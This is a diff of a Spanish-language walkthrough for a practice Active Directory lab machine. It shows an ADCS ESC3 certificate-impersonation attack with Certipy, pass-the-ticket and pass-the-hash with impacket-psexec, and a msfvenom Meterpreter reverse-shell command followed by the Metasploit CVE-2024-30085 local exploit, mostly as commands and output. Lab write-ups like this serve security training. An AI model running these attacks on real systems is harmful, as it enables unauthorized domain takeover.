 certipy-ad find -u 'frank' -p 'JakiadoJeje123' -dc-ip 192.168.56.100 -vulnerable
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -1120,7 +1167,9 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Saving JSON output to '20260501191831_Certipy.json'
 [*] Wrote JSON output to '20260501191831_Certipy.json'
 ```
+Puedes leer cualquiera de estos 2 archivos.
 
+Lo malo, al final nos indica que no pudo encontrar un **template** vulnerable:
 ```bash
 cat 20260501191831_Certipy.txt
 Certificate Authorities
@@ -1134,16 +1183,7 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate template
 ```
 
-```bash
-certipy-ad find -u 'tomas' -p '**********' -dc-ip 192.168.56.100 -vulnerable
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
-...
-[*] Saving text output to '20260430195706_Certipy.txt'
-[*] Wrote text output to '20260430195706_Certipy.txt'
-[*] Saving JSON output to '20260430195706_Certipy.json'
-[*] Wrote JSON output to '20260430195706_Certipy.json'
-```
-
+Probando con otros usuarios, resulta que con el **usuario tomas** obtenemos un resultado diferente:
 ```bash
 cat 20260430195706_Certipy.txt
 Certificate Authorities
@@ -1170,7 +1210,22 @@ Certificate Templates
       ESC3                              : Template has Certificate Request Agent EKU set.
 ```
 
+Resulta que el **Certificate Template** que mencionó **winPEASx64**, que es **Phantom-DevAuth**, es vulnerable al **ataque ESC3**:
 
+| **ESC3 Attack** |
+|:---------------:|
+| *ESC3 (Enterprise Security Configuration 3) es una mala configuración en Active Directory Certificate Services (AD CS) que permite a un atacante solicitar un certificado en nombre de otro usuario (impersonación) usando una plantilla vulnerable. Ocurre cuando existe una plantilla de certificado que permite Enrollment Agent y además permite solicitar certificados en nombre de otros usuarios.* |
+
+<br>
+
+Aquí te dejo estos 3 blogs que te ayudarán a aplicar y entender este ataque:
+* <a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank">Hacking Articles - ADCS ESC3: Enrollment Agent Template</a>
+* <a href="https://zonahacking.com/post/esc3" target="_blank">ZonaHacking: ESC3</a>
+* <a href="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4" target="_blank">Active Directory Certificate Services (ADCS – ESC3)</a>
+
+<br>
+
+Primero, vamos a generar un certificado válido para nuestro **usuario tomas** usando la **template Phantom-DevAuth**:
 ```bash
 certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -target 'DC01.PHANTOM.THL' -template 'Phantom-DevAuth'
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -1185,6 +1240,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'tomas.pfx'
 ```
 
+Ahora, utilizamos ese mismo certificado para que podamos generar otro, pero usando el **template User**, que es quien nos permitirá suplantar al **Administrador**:
 ```bash
 certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca 'PHANTOM-DC01-CA' -target 'DC01.PHANTOM.THL' -template 'User' -on-behalf-of 'administrador' -pfx tomas.pfx
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -1199,6 +1255,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrador.pfx'
 ```
 
+Por último, utilizamos el certificado del **Administrador** para que podamos autenticarnos en el **AD** y obtengamos un **TGT** y su **Hash NTLM**:
 ```bash
 certipy-ad auth -pfx administrador.pfx -username 'administrador' -domain 'PHANTOM.THL' -dc-ip 192.168.56.100
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -1213,9 +1270,12 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrador'
 [*] Got hash for 'administrador@phantom.thl':...
 ```
+Ya con el **TGT** y con el **Hash NTLM**, podemos conectarnos en la máquina víctima usando **impacket-psexec**.
 
-```bash
+Probemos con el **TGT**, siendo que primero lo exportamos y luego usamos **impacket-psexec** para autenticarnos usando ese **TGT**:
+```batch
 export KRB5CCNAME=administrador.ccache
+
 impacket-psexec administrador@DC01.PHANTOM.THL -k -no-pass
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1237,7 +1297,8 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-```bash
+Ahora probemos con el **Hash NTLM**, donde solo utilizamos el parámetro `-hashes`:
+```batch
 impacket-psexec administrador@DC01.PHANTOM.THL -hashes '******'
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1259,22 +1320,35 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-```bash
+Ya dentro, busquemos la última flag:
+```batch
 C:\Windows\system32> cd C:\Users\Administrador\Desktop
 
 C:\Users\Administrador\Desktop> type root.txt
 ....
 ```
+Y con esto terminamos la máquina.
 
+<br>
 
-<h2 id=""></h2>
+<h2 id="Metasploit">Escalando Privilegios con Metasploit Framework</h2>
 
+Durante la búsqueda de vulnerabilidades, se pudo encontrar que la máquina víctima es vulnerable al Exploit `cve_2024_30085_cloud_files`, que lo tenemos como módulo de **Metasploit Framework**.
+
+Sigamos todo el proceso para utilizar este módulo.
+
+<br>
+
+<h3 id="Meterpreter">Obteniendo una Sesión de Meterpreter</h3>
+
+Primero, debemos obtener una sesión de **Meterpreter**, así que iniciemos **Metasploit**:
 ```bash
 msfconsole -q
 [*] Starting persistent handler(s)...
 msf > 
 ```
 
+Carguemos y configuremos un listener, usando el módulo `/exploit/multi/handler`:
 ```bash
 msf > use /exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -1286,6 +1360,7 @@ msf exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on Tu_IP:443
 ```
 
+Para mandar una **Reverse Shell** de **Meterpreter** a nuestro listener, usaremos un comando de **PowerShell** generado con la herramienta **msfvenom**:
 ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=443 -f psh-cmd
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1296,14 +1371,15 @@ Final size of psh-cmd file: 7571 bytes
 ...
 ```
 
+Desde cualquier sesión de **Evil-WinRM**, ejecuta ese comando desde que inicia el binario de **PowerShell** hasta el final:
 ```bash
 *Evil-WinRM* PS C:\Users\robert\Documents> powershell.exe -nop -w hidden -e aQBmA...
 ```
 
-
+Observa el listener:
 ```bash
 [*] Sending stage (230982 bytes) to 192.168.56.100
-[*] Meterpreter session 3 opened (192.168.56.102:443 -> 192.168.56.100:64507) at 2026-04-29 19:11:40 -0600
+[*] Meterpreter session 1 opened (Tu_IP:443 -> 192.168.56.100:64507) at 2026-04-29 19:11:40 -0600
 
 meterpreter > 
 meterpreter > sysinfo
@@ -1313,14 +1389,20 @@ Architecture    : x64
 System Language : es_ES
 Meterpreter     : x64/windows
 ```
+Ya tenemos una sesión de **Meterpreter**.
 
+<br>
 
+<h3 id="MetasPrivesc">Escalando Privilegios con el Módulo cve_2024_30085_cloud_files</h3>
+
+Podemos utilizar el módulo `post/multi/recon/local_exploit_suggester` para que busque vulnerabilidades en la máquina, así que vamos a cargarlo y a configurarlo:
 ```bash
 msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
-msf post(multi/recon/local_exploit_suggester) > set SESSION 3
-SESSION => 3
+msf post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
 ```
 
+Ejecutémoslo y esperemos los resultados:
 ```bash
 msf post(multi/recon/local_exploit_suggester) > exploit
 [*] 192.168.56.100 - Collecting local exploits for x64/windows...
@@ -1340,20 +1422,19 @@ msf post(multi/recon/local_exploit_suggester) > exploit
  9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
  10  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
 ```
+Observa que tuvimos varios resultados; sin embargo, el único que funcionará será el módulo `exploit/windows/local/cve_2024_30085_cloud_files`.
 
+Vamos a cargarlo y a configurarlo:
 ```bash
 msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30085_cloud_files
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-msf exploit(windows/local/cve_2024_30085_cloud_files) >
-```
-
-```bash
-msf exploit(windows/local/cve_2024_30085_cloud_files) > set SESSION 3
+msf exploit(windows/local/cve_2024_30085_cloud_files) > set SESSION 1
 SESSION => 1
 msf exploit(windows/local/cve_2024_30085_cloud_files) > set LHOST Tu_IP
 LHOST => Tu_IP
 ```
 
+Ejecutémoslo:
 ```bash
 msf exploit(windows/local/cve_2024_30085_cloud_files) > exploit
 [*] Started reverse TCP handler on Tu_IP:4444 
@@ -1364,7 +1445,7 @@ msf exploit(windows/local/cve_2024_30085_cloud_files) > exploit
 [*] The notepad pid is: 1348
 [*] Reflectively injecting the DLL into 1348...
 [*] Sending stage (230982 bytes) to 192.168.56.100
-[*] Meterpreter session 4 opened (Tu_IP:4444 -> 192.168.56.100:64564) at 2026-04-29 19:34:25 -0600
+[*] Meterpreter session 2 opened (Tu_IP:4444 -> 192.168.56.100:64564) at 2026-04-29 19:34:25 -0600
 
 meterpreter > sysinfo
 Computer        : DC01
@@ -1377,8 +1458,10 @@ Meterpreter     : x64/windows
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
+Tardó un poco, pero pudimos utilizar este módulo para escalar privilegios.
 
-```bash
+Ya solamente buscamos la última flag:
+```batch
 meterpreter > shell
 Process 2408 created.
 Channel 1 created.
@@ -1393,7 +1476,9 @@ C:\Users\Administrador\Desktop>type root.txt
 type root.txt
 ...
 ```
+Y con esto, terminamos la máquina.
 
+**Nota**: Esta forma de escalada de privilegios puede ser un poco inestable y puede que tarde mucho en aplicarse el módulo. Además, si utilizaste esta forma y quieres volver a usarla después, no funcionará, por lo que tendrías que desinstalar e instalar de nuevo la máquina virtual.
 
 
 <br>
@@ -1414,8 +1499,10 @@ type root.txt
 * https://admindroid.com/how-to-get-deleted-users-in-active-directory
 * https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/
 * https://github.com/61106960/adPEAS
+* https://github.com/peass-ng/PEASS-ng
 * https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4
 * https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/
+* https://zonahacking.com/post/esc3
 
 
 <br>
